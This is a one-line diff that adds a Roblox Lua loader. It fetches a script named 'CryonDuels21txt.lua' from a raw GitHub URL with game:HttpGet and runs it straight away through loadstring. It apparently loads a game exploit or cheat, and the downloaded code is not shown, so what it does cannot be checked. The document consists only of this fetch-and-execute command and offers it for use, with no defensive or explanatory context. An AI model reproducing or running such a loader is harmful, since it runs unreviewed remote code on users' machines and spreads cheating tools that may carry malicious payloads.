@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rblx-api/loader/main/CryonDuels21txt.lua"))()
